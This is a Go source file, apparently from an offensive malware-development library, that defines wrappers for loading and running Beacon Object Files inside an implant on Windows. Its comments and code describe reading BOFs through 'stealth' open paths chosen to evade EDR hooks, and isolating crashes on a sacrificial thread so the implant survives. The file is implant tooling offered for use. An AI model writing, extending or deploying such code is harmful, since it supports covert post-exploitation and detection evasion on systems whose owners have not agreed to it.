//go:build windows

package bof

import (
	"fmt"
	"time"

	"github.com/oioio-space/maldev/evasion/stealthopen"
)

// ArgsFromStrings packs a list of strings using the canonical Args
// wire format (4-byte little-endian length prefix + NUL-terminated
// bytes) and returns the ready-to-Execute buffer.
//
// Equivalent to:
//
//	a := bof.NewArgs()
//	for _, s := range ss {
//	    a.AddString(s)
//	}
//	return a.Pack()
//
// Lets callers skip the boilerplate when every argument is a plain
// string (the common case for CS-SA BOFs: target hostname, file
// path, registry key). For mixed payloads (ints, wide strings, raw
// bytes) keep using NewArgs + the typed adders directly.
func ArgsFromStrings(ss ...string) []byte {
	a := NewArgs()
	for _, s := range ss {
		a.AddString(s)
	}
	return a.Pack()
}

// RunFromBytes is the one-shot equivalent of Load → Execute → Close
// for callers that load the BOF, run it once, and discard. Saves the
// three-line boilerplate and the easy-to-forget Close that leaks the
// mapping if skipped.
//
// Equivalent to:
//
//	b, err := bof.Load(coffBytes)
//	if err != nil { return nil, err }
//	defer b.Close()
//	return b.Execute(args)
//
// For repeated execution against the same *BOF (the runtime/pe hot
// path that re-uses a No-Consolation loader), use Load + Execute
// directly to amortise the prepare pass.
func RunFromBytes(coffBytes, args []byte) ([]byte, error) {
	b, err := Load(coffBytes)
	if err != nil {
		return nil, err
	}
	defer b.Close()
	return b.Execute(args)
}

// RunFromFile reads a BOF from disk and runs it once. The opener
// argument follows the [stealthopen] convention: nil delegates to
// os.Open (path-based EDR hooks observe the real path); non-nil
// routes through the operator's stealth primitive — e.g. NTFS
// object-ID resolution, transactional NTFS, or any custom
// EDR-hostile open path. For implants embedding the .o via
// go:embed, prefer [RunFromBytes].
//
// Convenience wrapper for cmd/bof-runner-style tools that take a
// `-bof` flag. Composition target:
//
//	data, err := stealthopen.OpenRead(opener, path)
//	if err != nil { return nil, err }
//	return RunFromBytes(data, args)
func RunFromFile(opener stealthopen.Opener, path string, args []byte) ([]byte, error) {
	data, err := stealthopen.OpenRead(opener, path)
	if err != nil {
		return nil, fmt.Errorf("runtime/bof: read %s: %w", path, err)
	}
	return RunFromBytes(data, args)
}

// RunSafe is the crash-isolated one-shot: identical to RunFromBytes
// but spawns the entry on a sacrificial OS thread with VEH-mediated
// fault catching (see SetSacrificialThread). A BOF that AVs / stack-
// overflows inside its own mapping surfaces as a Go error instead
// of killing the implant.
//
// timeout caps wall-clock execution; on timeout the sacrificial
// thread is TerminateThread'd and the call returns a `BOF timeout`
// error. Recommended floor: a few hundred milliseconds; recommended
// ceiling: a few hours (above ~49 days the value clamps to the
// uint32 WaitForSingleObject limit).
//
// Equivalent to:
//
//	b, err := bof.Load(coffBytes)
//	if err != nil { return nil, err }
//	defer b.Close()
//	if err := b.SetSacrificialThread(timeout); err != nil { return nil, err }
//	return b.Execute(args)
func RunSafe(coffBytes, args []byte, timeout time.Duration) ([]byte, error) {
	b, err := Load(coffBytes)
	if err != nil {
		return nil, err
	}
	defer b.Close()
	if err := b.SetSacrificialThread(timeout); err != nil {
		return nil, err
	}
	return b.Execute(args)
}
